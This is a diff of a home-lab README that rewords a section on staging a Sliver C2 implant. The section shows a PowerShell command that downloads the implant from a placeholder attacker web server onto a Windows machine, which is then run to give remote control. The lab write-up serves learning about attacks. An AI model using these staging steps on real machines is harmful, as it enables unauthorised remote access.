@@ -20,19 +20,23 @@ The Technologies and Tools used during this project:
 
 ## Labbing
 
-After environment is set up I created a Sliver-Server C2 implant on the Ubuntu server to install on to the Windows System
+After setting up the environment, the next step involved creating a Sliver-Server C2 implant on the Ubuntu server to be installed on the Windows system.
+
 
 ![Implant](https://i.imgur.com/LEP0qSk.png)
 
-Next I created quick websever on the Ubuntu machine for the C2 Payload to be installed from, then I ran this powershell command on the Windows device.
+
+To facilitate the installation process, a quick web server was set up on the Ubuntu machine. This web server would host the C2 payload, allowing it to be easily accessed and downloaded by the Windows device.
+
+On the Windows system, a PowerShell command was executed to initiate the download and save the C2 implant. The specific PowerShell command used was:
 
 ![IWR](https://i.imgur.com/dadsDeX.png)
 
-Command: IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
+IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
 
+In this command, [IpAddress] refers to the IP address of the Ubuntu machine hosting the C2 payload, [ImplantName] represents the name of the C2 implant file, and [FileLocation] indicates the desired location on the Windows system where the implant should be saved.
 
-After downloading the implant we need to run the malicious file 
-
+Once the C2 implant is successfully downloaded onto the Windows device, the next step would involve executing the malicious file. This execution grants the C2 infrastructure control over the compromised Windows system, allowing for remote access and potential malicious activities.
 
 ![Excute](https://i.imgur.com/mkdYQkp.png)
 
